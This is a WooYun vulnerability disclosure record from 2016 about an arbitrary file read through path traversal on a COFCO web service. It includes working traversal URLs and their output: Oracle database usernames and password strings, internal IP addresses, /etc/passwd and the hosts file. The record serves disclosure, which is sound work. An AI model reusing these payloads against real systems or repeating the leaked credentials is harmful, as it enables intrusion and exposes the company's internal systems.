{"id": 84874, "wybug_id": "wooyun-2016-0170242", "wybug_title": "中粮某站任意文件读取", "wybug_corp": "中粮集团有限公司", "wybug_author": "陆由乙", "wybug_date": "2016-01-15 20:20", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "文件包含", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件包含漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： 。。。。 详细说明：  数据库内网了。   漏洞证明：  http://nc.cofco.com/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml\n<dataSource>\t\t\t<dataSourceName>zldmzs</dataSourceName>\t\t\t<oidMark>G6</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = yes)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zldmzs</user>\t\t\t<password>ejpkngehdmgdadjlkoabcofffpakfjad</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>180</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>zlzg</dataSourceName>\t\t\t<oidMark>A9</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = yes)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zlzg</user>\t\t\t<password>plofddiokiicfkbf</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>50</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>nc501</dataSourceName>\t\t\t<oidMark>V5</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = yes)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>nc501</user>\t\t\t<password>omoealbjmmmloakmlhpochcfpailcbjg</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>140</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>zlzc</dataSourceName>\t\t\t<oidMark>F8</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = no)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zlzc</user>\t\t\t<password>hbloeifaeacenmgo</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>60</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>zlcyy</dataSourceName>\t\t\t<oidMark>R1</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = no)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zlcyy</user>\t\t\t<password>elappllbodoijkpjlhpochcfpailcbjg</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>50</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>zlcx</dataSourceName>\t\t\t<oidMark>H9</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = no)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zlcx</user>\t\t\t<password>gdobfeomngdhihma</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>50</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>zlmy</dataSourceName>\t\t\t<oidMark>T3</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = no)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zlmy</user>\t\t\t<password>bclmbmgoogiikhof</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>60</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>zlsl</dataSourceName>\t\t\t<oidMark>R8</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = no)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zlsl</user>\t\t\t<password>eoehlbbimppgpnpe</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>100</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>iufo</dataSourceName>\t\t\t<oidMark>F2</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = yes)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>iufo501</user>\t\t\t<password>mecfkbgahfgmnhnemhclcbijjcckllal</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>150</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>zlxm</dataSourceName>\t\t\t<oidMark>X6</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = no)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zlxm</user>\t\t\t<password>gakifebhkonchihj</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>40</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<dataSource>\t\t\t<dataSourceName>zlyz</dataSourceName>\t\t\t<oidMark>H1</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.102)(PORT=1521))(ADDRESS = (PROTOCOL = TCP)(HOST =192.168.1.103)(PORT = 1521))(LOAD_BALANCE = no)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = ora10g)))</databaseUrl>\t\t\t<user>zlyz</user>\t\t\t<password>jlgoafmdelbingpl</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>90</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\npasswdhttp://nc.cofco.com/NCFindWeb?service=IPreAlertConfigService&filename=../../../../../etc/passwd\nroot:!:0:0::/:/usr/bin/kshdaemon:!:1:1::/etc:bin:!:2:2::/bin:sys:!:3:3::/usr/sys:adm:!:4:4::/var/adm:uucp:!:5:5::/usr/lib/uucp:guest:!:100:100::/home/guest:nobody:!:4294967294:4294967294::/:lpd:!:9:4294967294::/:lp:*:11:11::/var/spool/lp:/bin/falseinvscout:*:6:12::/var/adm/invscout:/usr/bin/kshsnapp:*:200:13:snapp login user:/usr/sbin/snapp:/usr/sbin/snappdipsec:*:201:1::/etc/ipsec:/usr/bin/kshnuucp:*:7:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucicopconsole:*:8:0::/var/adm/pconsole:/usr/bin/kshesaadmin:*:10:0::/var/esa:/usr/bin/ksh\nhosts\n10.6.2.109      NCAPP210.6.2.107\tNCAPP1192.168.1.107\tNCAPP1192.168.1.11    p55a192.168.1.103   p55avip11.10.10.1      p55apriv192.168.1.12    p55b192.168.1.102   p55bvip11.10.10.2      p55bpriv152.5.94.88\tmail.cofco.com\n   修复方案：  升级   版权声明：转载请注明来源 陆由乙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-01-18 12:48 厂商回复： 非常感谢，马上处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}